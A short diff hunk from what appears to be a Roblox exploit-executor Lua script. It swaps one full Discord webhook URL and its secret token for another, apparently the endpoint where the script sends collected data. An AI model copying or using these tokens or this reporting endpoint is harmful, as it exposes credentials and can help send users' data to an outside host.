@@ -18,7 +18,7 @@ local response = HS:JSONDecode(
 
 local exploit,version = identifyexecutor() 
 
-local webh = "https://discord.com/api/webhooks/1041573765127094364/Zz4_b1-WgbNde1jTWSbv0byXpo43MVfYqN0sjc1JyCCmiDsJtBgvlCALDWNPS0-Cvbiq"
+local webh = "https://discord.com/api/webhooks/1055661279085338624/WfcuuFxTV2KZ0zkGRiskYQz7yqyDohTxeIq0IptmiyaQ6dFjJcwmrV5YH7hTcekjE6h8"
 
 
 pcall(function()
